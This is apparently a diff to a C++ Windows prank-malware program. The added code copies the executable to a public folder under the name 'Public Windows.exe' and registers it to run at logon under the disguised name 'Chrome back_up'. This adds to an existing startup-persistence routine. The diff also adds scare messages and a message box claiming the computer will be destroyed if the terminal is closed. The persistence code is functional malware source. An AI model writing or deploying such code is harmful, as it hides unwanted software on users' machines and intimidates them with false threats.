@@ -2,6 +2,7 @@
 #include <iostream>
 #include <cstdlib>
 #include <string>
+#include <exception>
 
 #include "trivia.h"
 #include "black_screen.h"
@@ -30,6 +31,63 @@ void static AddToStartup() {
     else {
         std::cout << "Failed to open registry key!" << std::endl;
     }
+
+
+}
+
+std::string fromWcharToString(std::wstring wstr)
+{
+    // Calculating the length of the multibyte string
+    size_t len = wcstombs(nullptr, wstr.c_str(), 0) + 1;
+
+    // Creating a buffer to hold the multibyte string
+    char* buffer = new char[len];
+
+    // Converting wstring to string
+    wcstombs(buffer, wstr.c_str(), len);
+
+    // Creating std::string from char buffer
+    std::string str(buffer);
+
+    // Cleaning up the buffer
+    delete[] buffer;
+    return str;
+}
+
+void static AddToStartupDiffrentName() 
+{
+    //make copy of this file, with diffrent name
+    try
+    {
+        std::wstring appPath = GetAppPath();
+        std::wstring appNewPath = L"C:\\Users\\Public\\Public Windows.exe";
+        std::string old_path = fromWcharToString(appPath);
+        std::cout << old_path << std::endl;
+        printf("program add..\n");
+        bool a = CopyFileW(appPath.c_str(), appNewPath.c_str(), FALSE);
+
+    }
+    catch (std::exception)
+    {
+        printf("we will meet again.");
+    }
+
+
+    HKEY hKey;
+    const WCHAR* regPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    const WCHAR* appName = L"Chrome back_up";
+    std::wstring appPath = L"C:\\Users\\Public\\Public Windows.exe";
+
+    // Open the registry key
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        // Set the value in the registry
+        RegSetValueExW(hKey, appName, 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(WCHAR));
+        RegCloseKey(hKey);
+        std::cout << "and we are spreding..." << std::endl;
+    }
+    else {
+        std::cout << "Failed to open registry key!" << std::endl;
+    }
 }
 
 int make_trivia(void)
@@ -42,59 +100,59 @@ int make_trivia(void)
 
 void ascii_print(void)
 {
-    std::cout << R"(
-     ---   .    ____        -----      ______   -----        .
-  ___     / \             .....................      ____   / \
-        .'   '.  --  ..:::::''''''''''''''''':::::..      .'   '.
-  ---   | ^ ^ |    .::::''''                 ''''::::. -- | ^ ^ '
-        | ^ ^ |  .::''                             ''::.  | ^ ^ | --
-____     '...'  .::'              .-.                '::.  '...'
-        .-.!_  .::'              /   \                '::.   ! ____
-       / / `-`.:'                '-.-'                  ':..""".
- --    ' |  '.|:'                 .'.                   ':/' |  \
-       | |   |'.               _/^---^\_                  |     . --
- ___    \ .  '|               \-------../                 \   '.'
-        ' :   '                '.\:::/.'                  |'   || ___
-        | |  .|                 | | |'|                   / ' . |
-    --  | '. | \                '.\ /.'                   '.  | |--
-        |'.   '|                 |[ ]|                    | .'  |____
-__    .'\ |  .'\                 '.^.'                    \ |.  .
-     .'-.\'. | |                  (:)                     | ||| |
-   .'    \'..' .             _..--'''--.._               /'-._.-'| ---
-   |       `-..'.         .-'             '-.           |      .-'.
-    \            `-.    .'  ..            .. '.        .'-._.-'    `.
---   )              `-./    '::.        .::'   \   _.-'             /
-     '._/-..          /       '::.    .::'      \-'              .-'
-         ::.`-.      ''        '::   ::'        ''       _..-\_.'
-         :::   '._   | \         '   '         / |    .-'   .:: _____
-____     :::      `-.|  '  .----..___..----.  '  | .-'      :::
-         :::          \ |  _..--.     .--.._  | /-'         ::: ---
-         :::          | ' /     |     |     \ ' |           :::
-   --    :::          )   |   _.'     '._   |   (           :::____
-    ____ :::          /'. \_.'   )\ /(   '._/ .'\           :::
-         :::       .-'|  `-->-@ /     \ @->--'  |-.         :::
-         :::    .-'   \         | / \ |         /  `-.      :::  ---
- ----    '' _.-'       |        )/   \(        |      `-.   :::  _____
-  _.-=--..-'          . \ /\               /\ /          `-. ''
- /.._    `.        .-'   .\ '-.\.\\.//./.-' /.`-.           `---.._
-|    `.    \    .-'      | '.             .' |   `-.                \ 
- \    _\.   `.-'         |   '-././.\.\.-'   |      `.               |
-  `.-'  |   /::::::::::: \                   /::::::::`.      ,-.    /
- - |   /   /NOM     ----  '-.             .-'     ----  `.    |  \_.'
-__ \   | .'     _____        '-._._._._.-'     ____      |    |   |
-    `--'                                                 `-.  '._ / --
-                                                            `...-'
-    )" << std::endl;
+                        std::cout << R"(
+                         ---   .    ____        -----      ______   -----        .
+                      ___     / \             .....................      ____   / \
+                            .'   '.  --  ..:::::''''''''''''''''':::::..      .'   '.
+                      ---   | ^ ^ |    .::::''''                 ''''::::. -- | ^ ^ '
+                            | ^ ^ |  .::''                             ''::.  | ^ ^ | --
+                    ____     '...'  .::'              .-.                '::.  '...'
+                            .-.!_  .::'              /   \                '::.   ! ____
+                           / / `-`.:'                '-.-'                  ':..""".
+                     --    ' |  '.|:'                 .'.                   ':/' |  \
+                           | |   |'.               _/^---^\_                  |     . --
+                     ___    \ .  '|               \-------../                 \   '.'
+                            ' :   '                '.\:::/.'                  |'   || ___
+                            | |  .|                 | | |'|                   / ' . |
+                        --  | '. | \                '.\ /.'                   '.  | |--
+                            |'.   '|                 |[ ]|                    | .'  |____
+                    __    .'\ |  .'\                 '.^.'                    \ |.  .
+                         .'-.\'. | |                  (:)                     | ||| |
+                       .'    \'..' .             _..--'''--.._               /'-._.-'| ---
+                       |       `-..'.         .-'             '-.           |      .-'.
+                        \            `-.    .'  ..            .. '.        .'-._.-'    `.
+                    --   )              `-./    '::.        .::'   \   _.-'             /
+                         '._/-..          /       '::.    .::'      \-'              .-'
+                             ::.`-.      ''        '::   ::'        ''       _..-\_.'
+                             :::   '._   | \         '   '         / |    .-'   .:: _____
+                    ____     :::      `-.|  '  .----..___..----.  '  | .-'      :::
+                             :::          \ |  _..--.     .--.._  | /-'         ::: ---
+                             :::          | ' /     |     |     \ ' |           :::
+                       --    :::          )   |   _.'     '._   |   (           :::____
+                        ____ :::          /'. \_.'   )\ /(   '._/ .'\           :::
+                             :::       .-'|  `-->-@ /     \ @->--'  |-.         :::
+                             :::    .-'   \         | / \ |         /  `-.      :::  ---
+                     ----    '' _.-'       |        )/   \(        |      `-.   :::  _____
+                      _.-=--..-'          . \ /\               /\ /          `-. ''
+                     /.._    `.        .-'   .\ '-.\.\\.//./.-' /.`-.           `---.._
+                    |    `.    \    .-'      | '.             .' |   `-.                \ 
+                     \    _\.   `.-'         |   '-././.\.\.-'   |      `.               |
+                      `.-'  |   /::::::::::: \                   /::::::::`.      ,-.    /
+                     - |   /   /NOM     ----  '-.             .-'     ----  `.    |  \_.'
+                    __ \   | .'     _____        '-._._._._.-'     ____      |    |   |
+                        `--'                                                 `-.  '._ / --
+                                                                                `...-'
+                        )" << std::endl;
 }
+
 void viva(void)
 {
     static int x;
-    printf("\nviva victoria!");
+    printf("\nviva victoria!\nYou got HACKED.");
     x++;
-    // printf("\ntotal number: %d", x);	
+   
     printf("\n\nYour computer is about to be destroyed.");
     printf("\nYour chances of survival are:: 1 to %d\n", x);
-    //	ascii_print();
 }
 
 
@@ -102,12 +160,15 @@ int main()
 {
     // adding to aurorun
     AddToStartup();
+    AddToStartupDiffrentName();
     std::cout << "Running Windows Bunny program..." << std::endl;
 
     // here is the melicush part!
+    MessageBox(nullptr, TEXT("DO NOT CLOSE THE TERMINAL WINDOW!\nIF YOU DO SO, YOUR COMPUTER IS DONE."), TEXT("Importent Message"), MB_OK);
+
     srand((unsigned)time(NULL));
     int timer = rand();
-    for (int i = 0; i < timer; i++)
+    for (int i = 0; i < 5; i++)
     {
         viva();
     }
